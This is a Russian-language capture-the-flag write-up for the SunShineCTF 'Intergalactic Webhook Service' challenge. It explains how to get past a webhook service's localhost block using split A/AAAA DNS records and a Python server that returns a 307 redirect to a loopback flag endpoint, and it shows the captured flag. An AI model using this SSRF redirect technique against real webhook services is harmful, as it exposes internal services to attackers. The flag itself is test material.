# Intergalactic Webhook Service — Writeup

**Challenge:** Intergalactic Webhook Service (SunShineCTF)  


## TL;DR
Сервис блокирует явные локальные хосты (127.0.0.1, localhost). Обход: домен с `A → публичный IP` (чтобы пройти проверку), `AAAA → ::1` (loopback). Сервис считает хост публичным, получает редирект и конечный запрос попадает на `127.0.0.1:5001/flag` — флаг возвращён.

## PoC — шаги
1. Настроить DNS:
   - `A def.example.tld -> <PUBLIC_IP>`
   - `AAAA def.example.tld -> ::1`

2. На `PUBLIC_IP` запустить redirect сервер (`poC/redirect_server.py` ниже).

3. Ввести в сервис webhook URL:  
   `http://def.example.tld/trigger`

4. Ожидаемый результат: сервис делает POST → получает `307 Location: http://127.0.0.1:5001/flag` → финальный запрос к loopback возвращает флаг.

## poC/redirect_server.py
```py
#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer

TARGET = "http://127.0.0.1:5001/flag"

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        self.send_response(307)
        self.send_header("Location", TARGET)
        self.end_headers()

    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok\n")

if __name__ == "__main__":
    HTTPServer(("", 8000), Handler).serve_forever()
```

Запуск:
```bash
python3 poC/redirect_server.py
```

## Пример полученного ответа
```json
{"response":"sun{dns_r3blnd1ng_1s_sup3r_c00l!_ff4bd67cd1}","status":200}
```
